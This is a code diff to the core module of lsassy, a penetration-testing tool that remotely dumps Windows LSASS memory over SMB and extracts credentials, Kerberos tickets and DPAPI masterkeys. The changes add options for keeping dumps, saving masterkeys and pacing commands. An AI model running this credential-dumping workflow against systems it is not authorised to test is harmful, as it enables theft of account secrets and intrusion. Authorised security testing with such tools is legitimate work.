@@ -1,17 +1,17 @@
 import logging
-import signal
 import queue
-import time
-
+import signal
 import threading
+import time
 from queue import Queue
-from lsassy import logger
-from lsassy.utils import get_targets
-from lsassy.parser import Parser
-from lsassy.session import Session
-from lsassy.writer import Writer
+
+from lsassy import logger, __version__
 from lsassy.dumper import Dumper
 from lsassy.impacketfile import ImpacketFile
+from lsassy.parser import Parser
+from lsassy.session import Session
+from lsassy.utils import get_targets
+from lsassy.writer import Writer
 
 lock = threading.RLock()
 
@@ -62,15 +62,19 @@ class ThreadPool:
         return any(thread.is_alive() for thread in self.threads)
 
     def run(self):
-        logger.init()
+        logger.init(no_color=self.arguments.no_color)
         threading.current_thread().name = "[Core]"
 
         if self.arguments.v == 1:
             logging.getLogger().setLevel(logging.INFO)
         elif self.arguments.v >= 2:
             logging.getLogger().setLevel(logging.DEBUG)
+            threading.current_thread().name = "[DEBUG]"
+            logging.info("lsassy v {}".format(__version__))
         else:
             logging.getLogger().setLevel(logging.ERROR)
+
+        threading.current_thread().name = "[Core]"
         try:
             # Turn-on the worker threads
             for i in range(self.max_threads):
@@ -137,7 +141,9 @@ class Lsassy:
                 dump_path += "\\"
 
         parse_only = self.args.parse_only
+        keep_dump = self.args.keep_dump
         kerberos_dir = self.args.kerberos_dir
+        masterkeys_file = self.args.masterkeys_file
 
         if parse_only and (dump_path is None or self.args.dump_name is None):
             logging.error("--dump-path and --dump-name required for --parse-only option")
@@ -161,18 +167,18 @@ class Lsassy:
             )
 
             if session.smb_session is None:
-                logging.error("Couldn't connect to remote host")
+                logging.warning("Couldn't connect to remote host")
                 return False
 
             if not parse_only:
-                dumper = Dumper(session, self.args.timeout).load(self.args.dump_method)
+                dumper = Dumper(session, self.args.timeout, self.args.time_between_commands).load(self.args.dump_method)
                 if dumper is None:
                     logging.error("Unable to load dump module")
                     return False
 
                 file = dumper.dump(no_powershell=self.args.no_powershell, exec_methods=exec_methods,
                                    copy=self.args.copy, dump_path=dump_path,
-                                   dump_name=self.args.dump_name, timeout=self.args.timeout, **options)
+                                   dump_name=self.args.dump_name, **options)
                 if file is None:
                     logging.error("Unable to dump lsass.")
                     return False
@@ -187,10 +193,10 @@ class Lsassy:
                     logging.error("Unable to open lsass dump.")
                     return False
 
-            credentials, tickets = Parser(file).parse()
+            credentials, tickets, masterkeys = Parser(file).parse()
             file.close()
 
-            if not parse_only:
+            if not parse_only and not keep_dump:
                 ImpacketFile.delete(session, file.get_file_path(), timeout=self.args.timeout)
                 logging.success("Lsass dump deleted")
             else:
@@ -201,12 +207,16 @@ class Lsassy:
                 return False
 
             with lock:
-                Writer(credentials, tickets).write(
+                Writer(credentials, tickets, masterkeys).write(
+                    self.args.file_format,
                     self.args.format,
                     output_file=self.args.outfile,
                     quiet=self.args.quiet,
                     users_only=self.args.users,
-                    kerberos_dir=kerberos_dir
+                    tickets=not self.args.no_tickets,
+                    masterkeys=not self.args.no_masterkeys,
+                    kerberos_dir=kerberos_dir,
+                    masterkeys_file=masterkeys_file
                 )
 
         except KeyboardInterrupt:
@@ -230,7 +240,7 @@ class Lsassy:
             except Exception as e:
                 logging.debug("Potential issue while closing file: {}".format(str(e)))
 
-            if not parse_only:
+            if not parse_only and not keep_dump:
                 try:
                     if ImpacketFile.delete(session, file_path=file.get_file_path(), timeout=self.args.timeout):
                         logging.debug("Lsass dump deleted")
